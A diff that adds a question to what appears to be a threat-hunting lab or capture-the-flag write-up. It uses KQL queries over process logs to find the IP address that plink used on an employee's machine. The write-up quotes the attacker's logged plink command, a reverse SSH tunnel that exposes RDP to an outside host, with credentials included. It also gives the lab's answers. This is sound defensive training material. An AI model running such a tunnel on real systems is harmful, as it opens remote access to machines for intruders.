@@ -77,3 +77,30 @@ The first result that comes back shows the time when the file was downloaded.<br
 The second result from the previous query shows the file created on Ronnies computer. In the path column it shows 'C:\ProgramData\hacktivist_manifesto.ps1'. <br><br>
 
 **Answer: 1/10/2024, 8:55:51 AM**<br><br>
+
+**Q9 What IP address was used with plink on Ronnie's machine?**<br><br>
+
+First need to find the name of Ronnie's machine / computer and then pass that into the Process Events table looking for programs named plink.
+
+```
+let host=
+Employees
+| where name has "Ronnie McLovin"
+|distinct hostname;
+ProcessEvents
+| where hostname in (host) and process_commandline has "plink"
+```
+<br><br>
+
+Under the Process Commandline column the following information is shown.
+
+```
+plink.exe -R 3389:localhost:3389 -ssh -l $had0w -pw thruthW!llS3tUfree 168.57.191.100
+```
+<br>
+
+The IP address is shown that was used with plink on Ronnie's machine.<br><br>
+
+**Answer: 168.57.191.100**<br><br>
+
+
